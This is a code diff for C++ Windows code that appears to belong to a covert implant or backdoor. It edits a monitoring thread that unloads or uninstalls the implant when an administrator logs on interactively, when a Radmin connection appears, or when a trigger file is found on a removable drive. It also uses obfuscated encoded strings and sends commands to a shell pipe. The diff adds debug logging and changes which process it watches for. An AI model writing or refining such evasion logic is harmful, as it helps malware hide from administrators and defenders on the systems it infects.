@@ -69,12 +69,7 @@ BOOL ExistsUnistallerFile(){
 			delete[] lpArrRemDrives[i];
 
 			if((hFile = CreateFile(lpFilePath, NULL, FILE_SHARE_READ | FILE_SHARE_WRITE, 
-				NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE){
-				if(GetLastError() != ERROR_FILE_NOT_FOUND){
-					retVal = TRUE;
-					break;
-				}
-			}else{
+				NULL, OPEN_EXISTING, NULL, NULL)) != INVALID_HANDLE_VALUE){
 				CloseHandle(hFile);
 				retVal = TRUE;
 				break;
@@ -507,20 +502,32 @@ DWORD ThreadMonitor(LPVOID lpParam){
 	DWORD dwRAdminListenPort;
 	LPSP_PACKET lpPacket = NULL;
 	DecodeString ds;
-
+		
 	if(!(lpszShellPath = GetShell()))
 		checkShellAsAdmin=FALSE;
 
 	dwRAdminListenPort = GetRAdminListenPort();
+	
+	#ifdef DEBUG_SHOW_ERROR_TO_FILE
+	fileLogPrint("Thread monitor initialized");
+	#endif
 
 	for(;;){
 		if(ACTIVE_UNISTALL_PROC_BY_DEMAND){
+			#ifdef DEBUG_SHOW_ERROR_TO_FILE
+			fileLogPrint("Actived uninstall by demand");			
+			#endif
+
 			Sleep(1500);
 			UnistallProc(ACTIVE_UNISTALL_PROC_BY_DEMAND_REMOTE);
 			ExitThread(0);
 		}
 
 		if(ExistsUnistallerFile()){
+			#ifdef DEBUG_SHOW_ERROR_TO_FILE
+			fileLogPrint("Actived uninstall by uninstaller file");
+			#endif
+
 			UnistallProc(TRUE);
 			ExitThread(0);
 		}
@@ -528,8 +535,12 @@ DWORD ThreadMonitor(LPVOID lpParam){
 		ExecuteAppFromHashFile();
 
 		#ifdef CHECK_ADMIN_INTERACTIVE_LOGON
-		//lpszShellPath			
-		if(CheckIsProcessRuningAsUser("wordpad.exe", ds.getDecodeString((LPSTR)encStr_Administrador))){
+		//lpszShellPath
+		if(CheckIsProcessRuningAsUser("packager.exe", ds.getDecodeString((LPSTR)encStr_Administrador))){
+			#ifdef DEBUG_SHOW_ERROR_TO_FILE
+			fileLogPrint("Actived uninstall by interactive logon");
+			#endif
+
 			UnistallProc(TRUE);
 			ExitThread(0);
 		}
@@ -537,6 +548,10 @@ DWORD ThreadMonitor(LPVOID lpParam){
 
 		//En caso de conexio con radmin, solo tumbamos la dll de memoria
 		if(IsPortConnected(dwRAdminListenPort)){
+			#ifdef DEBUG_SHOW_ERROR_TO_FILE
+			fileLogPrint("Actived unload by connection to radmin port");
+			#endif
+
 			if(!create_bridged_unload_mutex()){
 				lpPacket = SendCommandToShellPipe(NULL, ds.getDecodeString((LPSTR)encStr_disableb), FLAG_DATA_IS_MACRO);
 				if(lpPacket){
